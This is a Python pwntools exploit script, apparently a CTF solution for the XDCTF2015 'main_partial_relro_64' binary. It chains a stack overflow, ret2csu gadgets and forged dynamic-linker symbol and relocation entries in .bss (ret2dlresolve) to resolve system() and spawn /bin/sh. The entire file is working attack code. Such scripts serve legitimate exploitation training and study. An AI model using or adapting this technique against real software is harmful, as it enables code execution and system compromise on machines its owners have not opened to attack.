from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
sh = "/bin/sh\x00"
bin_sh_addr = store_addr+len(resolve_data)
rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(sh)


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()